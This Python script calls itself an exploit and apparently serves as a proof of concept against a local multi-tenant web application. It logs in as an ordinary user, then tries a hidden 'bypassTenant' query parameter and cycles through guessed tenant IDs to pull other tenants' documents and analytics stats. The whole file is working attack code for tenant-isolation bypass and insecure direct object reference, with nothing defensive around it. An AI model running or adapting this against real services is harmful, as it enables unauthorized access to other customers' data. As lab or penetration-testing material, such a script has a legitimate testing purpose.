#!/usr/bin/env python3

import requests
import json

BASE_URL = "http://localhost:5000"

def exploit_tenant_bypass():
    print("[*] Testing tenant isolation bypass...")
    
    # Login as regular user
    login_data = {
        "email": "test@tenantguard.com",
        "password": "test123"
    }
    
    response = requests.post(f"{BASE_URL}/api/auth/login", json=login_data)
    if response.status_code != 200:
        print("[-] Login failed")
        return False
    
    token = response.json()["token"]
    headers = {"Authorization": f"Bearer {token}"}
    
    # Test tenant bypass parameter
    print("[*] Testing bypassTenant parameter...")
    
    # Try to access documents with tenant bypass
    params = {"bypassTenant": "true"}
    
    bypass_response = requests.get(f"{BASE_URL}/api/documents", 
                                 headers=headers, params=params)
    
    if bypass_response.status_code == 200:
        documents = bypass_response.json()
        print(f"[+] Bypassed tenant isolation! Retrieved {len(documents)} documents")
    
    # Test cross-tenant access with different tenant IDs
    print("[*] Testing cross-tenant document access...")
    
    tenant_ids = [
        "507f1f77bcf86cd799439011",
        "507f1f77bcf86cd799439012", 
        "507f1f77bcf86cd799439013"
    ]
    
    for tenant_id in tenant_ids:
        params = {"tenantId": tenant_id}
        
        cross_response = requests.get(f"{BASE_URL}/api/documents",
                                    headers=headers, params=params)
        
        if cross_response.status_code == 200:
            docs = cross_response.json()
            print(f"[+] Accessed {len(docs)} documents from tenant {tenant_id}")
    
    # Test analytics bypass
    print("[*] Testing analytics tenant bypass...")
    
    for tenant_id in tenant_ids:
        params = {"tenantId": tenant_id}
        
        analytics_response = requests.get(f"{BASE_URL}/api/analytics/stats",
                                        headers=headers, params=params)
        
        if analytics_response.status_code == 200:
            analytics = analytics_response.json()
            print(f"[+] Retrieved analytics for tenant {tenant_id}")
            print(f"    Users: {analytics.get('totalUsers', 0)}")
            print(f"    Documents: {analytics.get('totalDocuments', 0)}")
    
    return True

if __name__ == "__main__":
    exploit_tenant_bypass()